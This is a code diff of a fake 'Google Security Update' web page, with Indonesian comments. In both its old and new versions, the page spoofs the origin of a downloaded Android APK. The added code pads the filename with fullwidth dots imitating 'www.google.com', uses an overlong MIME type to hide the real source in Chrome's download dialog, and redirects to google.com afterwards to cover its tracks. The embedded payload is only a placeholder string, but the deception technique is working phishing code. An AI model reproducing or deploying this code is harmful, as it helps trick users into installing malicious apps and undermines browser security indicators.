@@ -2,41 +2,41 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security</title>
+    <title>Google Security Update</title>
 </head>
-<body style="background:#f1f3f4; text-align:center; padding-top:50px;">
-    <h2>Google Play Service Update</h2>
-    <button id="pwnBtn" style="padding:15px; background:#1a73e8; color:white; border:none; border-radius:5px;">UPDATE NOW</button>
+<body style="text-align:center; padding-top:50px; font-family: Arial;">
+    <button id="pwnBtn" style="padding:15px; background:#1a73e8; color:white; border:none; border-radius:5px;">
+        UPDATE GOOGLE SERVICES
+    </button>
 
 <script>
     document.getElementById('pwnBtn').addEventListener('click', function() {
-        const spoofDomain = "www.google.com";
+        // Taktik: Menggunakan Nama File yang sangat panjang untuk mendorong teks 'from' ke bawah
+        // Karakter 'FULLWIDTH FULL STOP' (．) digunakan agar terlihat seperti titik domain
+        const fakeDomain = "www．google．com";
+        const fileName = "Update_" + "verification_".repeat(30) + fakeDomain + ".apk";
         
-        // 1. Buat konten file palsu
-        const content = new Uint8Array([0x50, 0x4B, 0x03, 0x04]);
-        const blob = new Blob([content], {type: "application/vnd.android.package-archive"});
-        
-        // 2. Gunakan URL.createObjectURL
-        const blobUrl = URL.createObjectURL(blob);
-        
-        // 3. Gunakan karakter spesial untuk menyamarkan 'blob:https://'
-        // Kita gunakan %00 (Null Byte) atau %0A (Newline) jika didukung
-        const padding = " ".repeat(500); 
-        const fakeOrigin = "https://" + spoofDomain + "/update-verification-system-v2026/";
-        
-        // 4. TEKNIK INTI: Navigasi Langsung
-        // Alih-alih 'download', kita arahkan window ke blob tersebut.
-        // Chrome akan melihat ini sebagai navigasi ke file, lalu memicu dialog download.
-        const finalUrl = blobUrl + "#" + fakeOrigin;
+        // Taktik: Menggunakan MIME Type palsu yang sangat panjang
+        // Chrome terkadang menampilkan MIME Type jika ia tidak mengenali ekstensinya dengan cepat
+        const longMime = "application/octet-stream" + ";".repeat(200);
 
-        // Buka di jendela baru atau tab ini
-        window.location.href = finalUrl;
+        const base64Data = "ZXN0dGVzdHRlc3Q=";
+        
+        // Kita gunakan skema data: langsung
+        // Kita tidak menggunakan fragment (#) tapi langsung memasukkan domain ke dalam metadata
+        const payload = `data:${longMime};base64,${base64Data}`;
 
-        // Redirect ke google asli setelah jeda untuk menutupi jejak di address bar
+        const a = document.createElement('a');
+        a.href = payload;
+        a.download = fileName;
+        document.body.appendChild(a);
+        
+        a.click();
+
+        // Redirect instan untuk mengubah context origin di address bar
         setTimeout(() => {
             window.location.replace("https://www.google.com");
-        }, 800);
+        }, 300);
     });
 </script>
 </body>
